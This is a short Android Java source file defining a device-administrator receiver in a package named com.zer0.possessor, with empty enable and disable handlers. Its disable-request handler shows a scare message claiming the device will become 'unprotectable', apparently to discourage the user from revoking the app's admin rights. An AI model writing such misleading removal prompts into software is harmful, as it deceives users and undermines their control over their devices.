package com.zer0.possessor;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class DeviceAdmin extends DeviceAdminReceiver
{
    @Override
    public void onEnabled(Context context, Intent intent)
    {
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent)
    {
        return "You device will be unprotectable. Are you sure?";
    }

    @Override
    public void onDisabled(Context context, Intent intent)
    {
    }
}
